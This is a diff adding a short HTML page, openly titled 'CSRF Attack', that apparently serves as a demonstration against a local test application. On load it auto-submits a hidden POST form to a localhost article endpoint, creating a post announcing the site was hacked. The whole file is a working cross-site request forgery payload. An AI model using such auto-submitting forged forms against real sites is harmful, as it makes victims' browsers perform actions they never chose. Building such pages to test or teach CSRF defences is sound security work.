@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF Attack</title></head>
+<body onload="document.forms[0].submit();">
+<h3>⚠ Attempting CSRF Attack</h3>
+<form method="POST" action="http://localhost:8080/article">
+    <input type="hidden" name="title" value="🔥 Hacked Successfully!">
+    <input type="hidden" name="content" value="This post was created by an attacker.">
+</form>
+</body>
+</html>
